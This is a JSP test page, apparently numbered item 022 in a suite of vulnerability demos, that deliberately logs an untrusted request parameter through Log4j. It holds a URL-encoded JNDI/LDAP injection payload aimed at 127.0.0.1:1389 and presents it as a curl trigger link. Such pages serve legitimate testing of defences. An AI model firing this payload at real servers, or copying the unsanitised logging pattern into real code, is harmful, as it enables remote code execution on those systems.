<%@page import="org.apache.logging.log4j.Logger"%>
<%@page import="org.apache.logging.log4j.LogManager"%>
<%@ page contentType="text/html; charset=UTF-8" %>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>022 - Log4j漏洞测试</title>
</head>
<body>
<h1>022 - Log4j漏洞测试</h1>
<%
	String defaultQuery = "?log=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%31%33%38%39%2f%61%7d";
	Logger logger = LogManager.getLogger(this.getClass());
    String log = request.getParameter("log");
    if (log != null) {
        logger.error(log);
    }
%>
<p>触发: </p>
<p>curl '<a href="<%=request.getRequestURL()+defaultQuery%>"
            target="_blank"><%=request.getRequestURL() + defaultQuery%>
</a>'</p>
<br>
</body>
</html>
